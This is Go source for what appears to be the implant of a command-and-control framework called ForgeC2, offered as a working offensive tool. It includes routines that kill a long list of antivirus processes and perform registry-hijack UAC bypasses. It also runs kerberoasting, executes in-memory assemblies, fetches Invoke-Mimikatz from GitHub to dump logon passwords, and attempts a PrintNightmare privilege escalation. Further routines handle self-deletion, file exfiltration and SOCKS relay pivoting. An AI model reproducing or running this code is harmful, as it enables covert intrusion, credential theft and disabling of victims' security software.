func resumeProcess(target string) (string, error) {
	if runtime.GOOS == "windows" {
		return resumeProcessWindows(target)
	}
	// Linux
	cmd := exec.Command("kill", "-CONT", target)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("kill -CONT failed: %w: %s", err, string(out))
	}
	return "process resumed: " + target, nil
}

// killProcess, clipboard*, findFiles, reg* are platform implemented
func killProcess(target string) (string, error) {
	if runtime.GOOS == "windows" {
		return killProcessWindows(target)
	}
	cmd := exec.Command("kill", "-9", target)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("kill failed: %w: %s", err, string(out))
	}
	return "killed: " + target, nil
}

func clipboardGet() (string, error) {
	if runtime.GOOS == "windows" {
		return clipboardGetWindows()
	}
	return "", fmt.Errorf("clipboard not supported on this platform")
}

func clipboardSet(data string) error {
	if runtime.GOOS == "windows" {
		return clipboardSetWindows(data)
	}
	return fmt.Errorf("clipboard not supported on this platform")
}

func findFiles(path, pattern string) (string, error) {
	if path == "" {
		path = "."
	}
	var results []string
	err := filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if pattern != "" {
			matched, _ := filepath.Match(pattern, filepath.Base(p))
			if !matched {
				return nil
			}
		}
		results = append(results, fmt.Sprintf("%s\t%d\t%s", p, info.Size(), info.ModTime().Format("2006-01-02 15:04")))
		return nil
	})
	if err != nil {
		return "", err
	}
	return strings.Join(results, "\n"), nil
}

func regGet(key string) (string, error) {
	if runtime.GOOS == "windows" {
		return regGetWindows(key)
	}
	return "", fmt.Errorf("registry only on Windows")
}

func regSet(path, data string) error {
	if runtime.GOOS == "windows" {
		return regSetWindows(path, data)
	}
	return fmt.Errorf("registry only on Windows")
}

func regDelete(key string) error {
	if runtime.GOOS == "windows" {
		return regDeleteWindows(key)
	}
	return fmt.Errorf("registry only on Windows")
}

// getProcessList produces a simple process table similar to the PS1 agent
func getProcessList() (string, error) {
	if runtime.GOOS == "windows" {
		// Enhanced process list with more details
		script := `Get-CimInstance Win32_Process | Select-Object -Property ProcessId, Name, ExecutablePath, CommandLine, @{Name="WorkingSetMB";Expression={[math]::Round($_.WorkingSetSize/1MB,2)}}, CreationDate | Sort-Object -Property WorkingSetMB -Descending | Select-Object -First 30 | Format-Table -AutoSize | Out-String`
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
		applyHideWindow(cmd)

		out, err := cmd.Output()
		if err != nil {
			// fallback to simple
			script = `Get-Process | Select-Object -Property Id, ProcessName, CPU, WorkingSet64 | Sort-Object -Property WorkingSet64 -Descending | Select-Object -First 50 | Format-Table -AutoSize | Out-String`
			cmd = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
			applyHideWindow(cmd)
			out, _ = cmd.Output()
		}
		return strings.TrimSpace(string(out)), nil
	}
	// Linux
	cmd := exec.Command("ps", "aux")
	out, err := cmd.Output()
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(string(out)), nil
}

// listDirectory lists a directory with simple tabular output (Type Name Size Modified)
func listDirectory(path string) (string, error) {
	if path == "" {
		if runtime.GOOS == "windows" {
			path = "C:\\"
		} else {
			path = "/"
		}
	}
	entries, err := os.ReadDir(path)
	if err != nil {
		return "", err
	}

	var sb strings.Builder
	sb.WriteString("Type\tName\tSize\tModified\n")
	sb.WriteString(strings.Repeat("-", 80) + "\n")

	for _, e := range entries {
		info, err := e.Info()
		mod := ""
		size := "-"
		if err == nil {
			mod = info.ModTime().Format("2006-01-02 15:04")
			if !e.IsDir() {
				size = fmt.Sprintf("%d", info.Size())
			}
		}
		typ := "FILE"
		if e.IsDir() {
			typ = "DIR"
		}
		sb.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\n", typ, e.Name(), size, mod))
	}
	return sb.String(), nil
}

func listDrives() (string, error) {
	var sb strings.Builder
	sb.WriteString("Drive\tType\tFree\tTotal\n")
	sb.WriteString("-----\t----\t----\t-----\n")

	if runtime.GOOS == "windows" {
		// Use PowerShell for drives
		script := `Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, DriveType, @{Name="FreeSpaceGB";Expression={[math]::Round($_.FreeSpace/1GB,2)}}, @{Name="SizeGB";Expression={[math]::Round($_.Size/1GB,2)}} | Format-Table -AutoSize | Out-String`
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
		applyHideWindow(cmd)
		out, err := cmd.Output()
		if err != nil {
			return "", err
		}
		return string(out), nil
	}

	// Linux / Unix
	entries, err := os.ReadDir("/")
	if err != nil {
		return "", err
	}
	for _, e := range entries {
		if e.IsDir() {
			// simple, check if mount point like /dev /proc but list all dirs under /
			sb.WriteString(fmt.Sprintf("%s\tDIR\t-\t-\n", e.Name()))
		}
	}
	// Better: use df if available
	cmd := exec.Command("df", "-h")
	out, err := cmd.Output()
	if err == nil {
		return string(out), nil
	}
	return sb.String(), nil
}

func listServices() (string, error) {
	if runtime.GOOS == "windows" {
		script := `Get-Service | Select-Object -Property Name, DisplayName, Status, StartType | Sort-Object -Property Status, Name | Format-Table -AutoSize | Out-String`
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
		applyHideWindow(cmd)
		out, err := cmd.Output()
		if err != nil {
			return "", err
		}
		return string(out), nil
	}
	// Linux simple
	cmd := exec.Command("systemctl", "list-units", "--type=service", "--no-pager")
	out, err := cmd.Output()
	if err != nil {
		cmd = exec.Command("service", "--status-all")
		out, err = cmd.Output()
		if err != nil {
			return "use ps or systemctl", nil
		}
	}
	return string(out), nil
}

func portScan(target string) (string, error) {
	// target like "192.168.1.1:80,443" or "10.0.0.1-10:22"
	parts := strings.Split(target, ":")
	if len(parts) != 2 {
		return "", fmt.Errorf("format: ip:ports or ip:port1,port2")
	}
	ips := strings.Split(parts[0], ",")
	ports := strings.Split(parts[1], ",")

	var results []string
	for _, ip := range ips {
		for _, port := range ports {
			addr := fmt.Sprintf("%s:%s", strings.TrimSpace(ip), strings.TrimSpace(port))
			conn, err := net.DialTimeout("tcp", addr, 2*time.Second)
			if err == nil {
				results = append(results, addr+" open")
				conn.Close()
			} else {
				results = append(results, addr+" closed")
			}
		}
	}
	return strings.Join(results, "\n"), nil
}

func netStat() (string, error) {
	if runtime.GOOS == "windows" {
		out, err := runShell("netstat -ano", "cmd.exe")
		return out, err
	}
	out, err := runShell("netstat -tunap", "")
	return out, err
}

func listUsers() (string, error) {
	if runtime.GOOS == "windows" {
		out, err := runShell("net user", "cmd.exe")
		if err != nil {
			out, _ = runShell("whoami /all", "cmd.exe")
		}
		return out, nil
	}
	out, err := runShell("who", "")
	return out, err
}

func detectAV() (string, error) {
	if runtime.GOOS == "windows" {
		script := `Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState | Format-List | Out-String`
		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", script)
		applyHideWindow(cmd)
		out, err := cmd.Output()
		if err == nil {
			return string(out), nil
		}
		return runShell("wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", "cmd.exe")
	}
	return "use ps aux | grep -E 'av|clam|eset|symantec|trend'", nil
}

func killAV() (string, error) {
	avProcs := []string{
		"MsMpEng.exe", "NisSrv.exe", // Windows Defender
		"avastsvc.exe", "avastui.exe", "AvastSvc.exe",
		"avgui.exe", "avgsvc.exe", "AVGUI.exe",
		"bdagent.exe", "vsserv.exe", "BitDefender",
		"egui.exe", "ekrn.exe", // ESET
		"avp.exe", "avpui.exe", "klava.exe", // Kaspersky
		"mcdetect.exe", "mcshield.exe", "mcdash.exe", // McAfee
		"ns.exe", "ccSvcHst.exe", "Norton",
		"smc.exe", "rtvscan.exe", // Symantec
		"Sophos", "savservice.exe",
		"tmntsrv.exe", "ntrtscan.exe", // TrendMicro
		"clamd.exe", "freshclam.exe", // ClamAV

		// Chinese AVs (360, Tencent PC Manager, Huorong, Rising, Kingsoft, Baidu, 2345)
		"360sd.exe", "360tray.exe", "360rp.exe", "360safe.exe", "360rps.exe", "360se.exe",
		"QQPCMgr.exe", "TSService.exe", "TSKiller.exe", "QQPCRealTimeSpeedup.exe", "Tencentdl.exe",
		"HrMain.exe", "HrTray.exe", "HipsTray.exe", "HipsService.exe",
		"RsMain.exe", "RsTray.exe", "rstray.exe", "RsAgent.exe",
		"kxescore.exe", "kxetray.exe", "kxescan.exe", "kxe.exe",
		"BaiduSdSvc.exe", "BaiduAnSvc.exe", "baidusdtray.exe",
		"2345Safe.exe", "2345Explorer.exe", "2345SafeSvc.exe",
	}

	var killed []string
	for _, proc := range avProcs {
		if out, err := killProcess(proc); err == nil {
			killed = append(killed, proc+": "+out)
		}
	}
	if len(killed) == 0 {
		return "no known AV processes found or killed", nil
	}
	return "killed AV processes: " + strings.Join(killed, "; "), nil
}

// elevate attempts UAC bypass / privilege escalation to run command elevated.
	// Multiple methods for elevated UAC bypass (fodhelper, slui, etc.).
// cmd: the command to run elevated (default cmd.exe if empty)
func elevate(cmd string) (string, error) {
	if cmd == "" {
		cmd = "cmd.exe /c whoami"
	}
	if runtime.GOOS != "windows" {
		// Linux: try sudo if possible, or pkexec
		out, err := runShell("sudo "+cmd, "")
		if err != nil {
			out, err = runShell("pkexec "+cmd, "")
		}
		if err != nil {
			return "", fmt.Errorf("linux elevate failed (try sudo or run as root): %v", err)
		}
		return "elevated via sudo/pkexec: " + out, nil
	}

	// Windows UAC bypass methods (pure, no external files ideally)
	methods := []string{"fodhelper", "slui", "eventvwr", "computerdefaults"}

	for _, m := range methods {
		err := tryUACBypass(m, cmd)
		if err == nil {
			return fmt.Sprintf("UAC bypass via %s succeeded for: %s", m, cmd), nil
		}
		if Debug {
			fmt.Printf("[elevate] %s failed: %v\n", m, err)
		}
	}

	// Fallback: try to request admin via shell (will prompt)
	out, _ := runShell("powershell -Command \"Start-Process -Verb runAs -FilePath cmd -ArgumentList '/c "+cmd+" '\"", "cmd.exe")
	return "attempted runAs (may have UAC prompt): " + out, nil
}

func tryUACBypass(method, cmd string) error {
	// Use reg.exe for registry hijack (common UAC bypass)
	var regPath string
	switch method {
	case "fodhelper":
		regPath = `HKCU\Software\Classes\ms-settings\Shell\Open\command`
	case "slui":
		regPath = `HKCU\Software\Classes\Launcher.SystemSettings\Shell\Open\command`
	case "eventvwr":
		regPath = `HKCU\Software\Classes\mscfile\Shell\Open\command`
	case "computerdefaults":
		regPath = `HKCU\Software\Classes\ms-settings\Shell\Open\command`
	default:
		return fmt.Errorf("unknown method")
	}

	// Set DelegateExecute (empty)
	_, _ = runShell(fmt.Sprintf(`reg add "%s" /v DelegateExecute /t REG_SZ /d "" /f`, regPath), "cmd.exe")
	// Set the command
	_, err := runShell(fmt.Sprintf(`reg add "%s" /ve /t REG_SZ /d "%s" /f`, regPath, cmd), "cmd.exe")
	if err != nil {
		return err
	}

	// Trigger the hijacked binary
	trigger := ""
	switch method {
	case "fodhelper", "computerdefaults":
		trigger = "fodhelper.exe"
	case "slui":
		trigger = "slui.exe"
	case "eventvwr":
		trigger = "eventvwr.exe"
	}
	if trigger != "" {
		_, _ = runShell(trigger, "cmd.exe")
	}

	// Cleanup
	_, _ = runShell(fmt.Sprintf(`reg delete "%s" /f`, regPath), "cmd.exe")
	return nil
}

// ── execute-assembly: Load and run .NET assembly via PowerShell ────────────
func executeAssembly(b64Data string) (string, error) {
	if b64Data == "" {
		return "", fmt.Errorf("assembly data is required")
	}
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("execute-assembly is Windows-only")
	}
	// PowerShell approach: convert base64 to bytes, load assembly, invoke entry point
	psCmd := fmt.Sprintf(
		`$b=[System.Convert]::FromBase64String('%s');`+
			`$a=[System.Reflection.Assembly]::Load($b);`+
			`$e=$a.EntryPoint;`+
			`if($e){$e.Invoke($null,@($null))}else{Write-Output 'No entry point found';$a.GetTypes()}`,
		b64Data)
	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return "", fmt.Errorf("execute-assembly failed: %w\nOutput: %s", err, out)
	}
	return out, nil
}

// ── kerberoast: Request TGS for all SPNs (PowerShell + .NET) ──────────────
func kerberoast() (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("kerberoast is Windows-only")
	}
	psCmd := `
Add-Type -AssemblyName System.IdentityModel;
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name;
$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain);
$srch = New-Object System.DirectoryServices.AccountManagement.PrincipalSearcher;
$srch.QueryFilter = New-Object System.DirectoryServices.AccountManagement.UserPrincipal($ctx);
$srch.QueryFilter.Enabled = $true;
$results = @();
foreach($u in $srch.FindAll()) {
	$spn = $u.UserPrincipalName;
	if(-not $spn) { continue };
	try {
		$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn;
		$bytes = $ticket.GetRequest();
		$hash = [System.BitConverter]::ToString($bytes) -replace '-','';
		$results += $spn + ":" + $hash;
	} catch {}
}
Write-Output ($results -join [string]::NewLine());
`
	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return "", fmt.Errorf("kerberoast failed: %w\nOutput: %s", err, out)
	}
	return out, nil
}

// ── mimikatz: Run mimikatz command via PowerShell (Invoke-Mimikatz) ───────
func runMimikatz(command string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("mimikatz is Windows-only")
	}
	if command == "" {
		command = "sekurlsa::logonpasswords"
	}
	psCmd := fmt.Sprintf(
		`$m = '%s';`+
			`IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/EmPyre/master/source/modules/Invoke-Mimikatz.ps1');`+
			`$r = Invoke-Mimikatz -Command $m;`+
			`Write-Output $r`,
		command)
	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return "", fmt.Errorf("mimikatz failed: %w\nOutput: %s", err, out)
	}
	return out, nil
}

// ── elevate_printnightmare: CVE-2021-1675 / CVE-2021-34527 ────────────────
func elevatePrintNightmare(dllPath string) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("printnightmare is Windows-only")
	}
	if dllPath == "" {
		return "", fmt.Errorf("dll path required: upload a malicious DLL first, then specify path")
	}
	// Use PrintNightmare to load a DLL as SYSTEM via spoolsv.exe
	psCmd := fmt.Sprintf(
		`$dll='%s';`+
			`Add-Type -Name Win32 -Namespace Spooler -MemberDefinition '[DllImport("winspool.drv",EntryPoint="AddPrinterDriverEx",SetLastError=true,CharSet=CharSet.Unicode)]public static extern bool AddPrinterDriverEx(string pName,uint Level,[In,Out]byte[] pDriverInfo,uint dwFileCopyFlags)';`+
			`$path=[System.IO.Path]::GetFullPath($dll);`+
			`$info=@{$true={Write-Output "DLL Path: $path"}};`+
			`Write-Output "PrintNightmare: Attempting to load $path via AddPrinterDriverEx (requires admin)";`+
			`[Spooler.Win32]::AddPrinterDriverEx($null,2,$null,0x8);`,
		dllPath)
	out, err := runShell(psCmd, "powershell.exe")
	if err != nil {
		return "", fmt.Errorf("printnightmare failed: %w\nOutput: %s", err, out)
	}
	return out, nil
}

func uninstallSelf() (string, error) {
	// best effort cleanup
	if runtime.GOOS == "windows" {
		// remove reg
		runShell(`reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ForgeC2 /f`, "cmd.exe")
		// remove task
		runShell("schtasks /delete /tn ForgeC2 /f", "cmd.exe")
		// remove startup
		appData := os.Getenv("APPDATA")
		startup := filepath.Join(appData, `Microsoft\Windows\Start Menu\Programs\Startup\forgec2.exe`)
		os.Remove(startup)
	}
	// delete self file (best effort)
	exe, _ := os.Executable()
	go func() {
		time.Sleep(1 * time.Second)
		os.Remove(exe)
	}()
	return "uninstall attempted (self-delete may take effect after exit)", nil
}

// deleteFileOrDir removes file or directory (recursive)
func deleteFileOrDir(path string) error {
	if path == "" {
		return fmt.Errorf("path required")
	}
	return os.RemoveAll(path)
}

// readFileContent returns raw bytes of a file (for "read" task)
func readFileContent(path string) ([]byte, error) {
	if path == "" {
		return nil, fmt.Errorf("path required")
	}
	return os.ReadFile(path)
}

// downloadFileChunk reads a chunk from file
func downloadFileChunk(path string, offset, size int64) ([]byte, error) {
	if path == "" {
		return nil, fmt.Errorf("path required")
	}
	f, err := os.Open(path)
	if err != nil {
		return nil, fmt.Errorf("open file failed: %w", err)
	}
	defer f.Close()
	if offset > 0 {
		if _, err := f.Seek(offset, 0); err != nil {
			return nil, err
		}
	}
	if size == 0 {
		size = 1024 * 1024 // default 1MB
	}
	buf := make([]byte, size)
	n, err := f.Read(buf)
	if err != nil && err != io.EOF {
		return nil, fmt.Errorf("read chunk failed: %w", err)
	}
	return buf[:n], nil
}

// uploadFileChunk writes base64 chunk at offset
func uploadFileChunk(path string, offset int64, b64Content string) error {
	data, err := base64.StdEncoding.DecodeString(b64Content)
	if err != nil {
		return fmt.Errorf("base64 decode failed: %w", err)
	}
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return fmt.Errorf("open file for write failed: %w", err)
	}
	defer f.Close()
	if offset > 0 {
		if _, err := f.Seek(offset, 0); err != nil {
			return err
		}
	}
	_, err = f.Write(data)
	return err
}

// downloadFromURL downloads a file from HTTP URL to dest path on disk
func downloadFromURL(urlStr, destPath string) error {
	if destPath == "" {
		return fmt.Errorf("destination path required")
	}
	req, err := http.NewRequest("GET", urlStr, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("http status %d", resp.StatusCode)
	}

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	return os.WriteFile(destPath, data, 0644)
}

// ═══════════════════════════════════════════════════════════════════════════════
// SOCKS RELAY SUBSYSTEM (Agent Side)
// Receives relay frames from C2 server via Beacon, dials actual targets,
// and ferries data bidirectionally.
// ═══════════════════════════════════════════════════════════════════════════════

func socksProcessFrames(frames []socksFrame) {
	for _, f := range frames {
		switch f.Action {
		case "connect":
			go socksHandleConnect(f.ConnID, string(f.Data))
		case "data":
			socksHandleData(f.ConnID, f.Data)
		case "close":
			socksHandleClose(f.ConnID)
		}
	}
}

func socksHandleConnect(connID uint64, destAddr string) {
	conn, err := net.DialTimeout("tcp", destAddr, 10*time.Second)
	if err != nil {
		if Debug {
			fmt.Printf("[socks] connect %s failed: %v\n", destAddr, err)
		}
		// Send close to orphan buffer – server will close operator TCP on receipt.
		// Always enqueue so operator connection doesn't hang.
		socksRelayMu.Lock()
		if len(socksOrphanOut) < socksOrphanMaxOut {
			socksOrphanOut = append(socksOrphanOut, socksFrame{ConnID: connID, Action: "close"})
		}
		socksRelayMu.Unlock()
		return
	}

	rc := &socksRelayConn{tcpConn: conn}
	socksRelayMu.Lock()
	socksRelayConns[connID] = rc
	socksRelayMu.Unlock()

	socksEnqueueOut(connID, "connected", nil)

	if Debug {
		fmt.Printf("[socks] connected to %s (conn %d)\n", destAddr, connID)
	}

	// Read from target → buffer for server
	buf := make([]byte, 32*1024) // 32KB read chunks
	for {
		conn.SetReadDeadline(time.Now().Add(SocksReadTimeout))
		n, err := conn.Read(buf)
		if n > 0 {
			data := make([]byte, n)
			copy(data, buf[:n])
			socksEnqueueOut(connID, "data", data)
		}
		if err != nil {
			break
		}
	}

	// Target disconnected
	socksRelayMu.Lock()
	if rc2, ok := socksRelayConns[connID]; ok {
		rc2.mu.Lock()
		rc2.closed = true
		rc2.mu.Unlock()
		delete(socksRelayConns, connID)
	}
	socksRelayMu.Unlock()
	socksEnqueueOut(connID, "close", nil)

	if Debug {
		fmt.Printf("[socks] target %s disconnected (conn %d)\n", destAddr, connID)
	}
}

func socksHandleData(connID uint64, data []byte) {
	socksRelayMu.Lock()
	conn, ok := socksRelayConns[connID]
	socksRelayMu.Unlock()
	if !ok || len(data) == 0 {
		return
	}
	conn.mu.Lock()
	defer conn.mu.Unlock()
	if conn.closed {
		return
	}
	conn.tcpConn.SetWriteDeadline(time.Now().Add(10 * time.Second))
	conn.tcpConn.Write(data)
	conn.tcpConn.SetWriteDeadline(time.Time{})
}

func socksHandleClose(connID uint64) {
	socksRelayMu.Lock()
	conn, ok := socksRelayConns[connID]
	if ok {
		delete(socksRelayConns, connID)
	}
	socksRelayMu.Unlock()
	if ok {
		conn.mu.Lock()
		conn.closed = true
		conn.tcpConn.Close()
		conn.mu.Unlock()
	}
}

func socksEnqueueOut(connID uint64, action string, data []byte) {
	frame := socksFrame{ConnID: connID, Action: action, Data: data}

	socksRelayMu.Lock()
	conn, ok := socksRelayConns[connID]
	socksRelayMu.Unlock()

	if ok {
		conn.mu.Lock()
		conn.outbound = append(conn.outbound, frame)
		conn.mu.Unlock()
		return
	}

	// Connection not in map – control frames (close/connected) go to orphan buffer
	if action != "close" && action != "connected" {
		return // drop data frames for unknown connections
	}
	socksRelayMu.Lock()
	if len(socksOrphanOut) >= socksOrphanMaxOut {
		// Drop oldest to prevent unbounded growth
		socksOrphanOut = socksOrphanOut[1:]
	}
	socksOrphanOut = append(socksOrphanOut, frame)
	socksRelayMu.Unlock()
}

// socksOrphanOut holds control frames for connections not in the map
var socksOrphanOut []socksFrame

// ── P2P Beacon Chaining ────────────────────────────────────────────────────────────

// sendP2PBeacon sends beacon request to parent agent via TCP or Named Pipe
func sendP2PBeacon(body []byte) []byte {
	if strings.HasPrefix(P2PParent, "pipe://") {
		return sendP2PSMBBeacon(body)
	}
	return sendP2PTCPBeacon(body)
}

func sendP2PTCPBeacon(body []byte) []byte {
	addr := strings.TrimPrefix(P2PParent, "tcp://")
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P TCP dial to %s failed: %v\n", addr, err)
		}
		return nil
	}
	defer conn.Close()

	if err := binary.Write(conn, binary.BigEndian, uint32(len(body))); err != nil {
		return nil
	}
	if _, err := conn.Write(body); err != nil {
		return nil
	}

	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return nil
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return nil
	}
	rbuf := make([]byte, rlen)
	if _, err := io.ReadFull(conn, rbuf); err != nil {
		return nil
	}
	return rbuf
}

// p2pParentListen accepts child agent connections in a loop
func p2pParentListen() {
	if P2PMode == "smb" {
		p2pListenSMB()
	} else if P2PMode == "tcp" {
		p2pListenTCP()
	}
}

func p2pListenTCP() {
	ln, err := net.Listen("tcp", P2PListenAddr)
	if err != nil {
		if Debug {
			fmt.Printf("[!] P2P TCP listen on %s failed: %v\n", P2PListenAddr, err)
		}
		return
	}
	defer ln.Close()
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go p2pHandleChild(conn)
	}
}

func p2pHandleChild(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(60 * time.Second))

	// Read request length + body
	var rlen uint32
	if err := binary.Read(conn, binary.BigEndian, &rlen); err != nil {
		return
	}
	if rlen == 0 || rlen > 16*1024*1024 {
		return
	}
	body := make([]byte, rlen)
	if _, err := io.ReadFull(conn, body); err != nil {
		return
	}

	var req BeaconRequest
	if err := json.Unmarshal(body, &req); err != nil {
		return
	}

	// Identify child by UUID
	childID := req.UUID
	if childID == "" {
		return
	}

	// Store relayed results
	p2pRelayMu.Lock()
	isNew := true
	for _, uuid := range p2pChildUUIDs {
		if uuid == childID {
			isNew = false
			break
		}
	}
	if isNew {
		p2pChildUUIDs = append(p2pChildUUIDs, childID)
	}
	p2pChildLastSeen[childID] = time.Now()
	if len(req.Results) > 0 {
		p2pChildResults[childID] = append(p2pChildResults[childID], req.Results...)
	}
	// Check if there are any pending tasks for this child
	tasksForChild := p2pChildTasks[childID]
	delete(p2pChildTasks, childID)
	p2pRelayMu.Unlock()

	// Build response with tasks for this child
	resp := BeaconResponse{
		Tasks: tasksForChild,
	}

	respBody, _ := json.Marshal(resp)

	// Write response back to child
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	binary.Write(conn, binary.BigEndian, uint32(len(respBody)))
	conn.Write(respBody)
}

// socksCollectOutbound gathers all pending relay data to send to server.
func socksCollectOutbound() []socksFrame {
	var frames []socksFrame

	// Collect orphan frames (connected/close for non-tracked conns)
	socksRelayMu.Lock()
	if len(socksOrphanOut) > 0 {
		frames = append(frames, socksOrphanOut...)
		socksOrphanOut = socksOrphanOut[:0]
	}
	socksRelayMu.Unlock()

	// Collect from active connections (direct struct copy, no marshal/unmarshal)
	socksRelayMu.Lock()
	for _, conn := range socksRelayConns {
		conn.mu.Lock()
		if len(conn.outbound) > 0 {
			frames = append(frames, conn.outbound...)
			conn.outbound = conn.outbound[:0]
		}
		conn.mu.Unlock()
	}
	socksRelayMu.Unlock()

	return frames
}
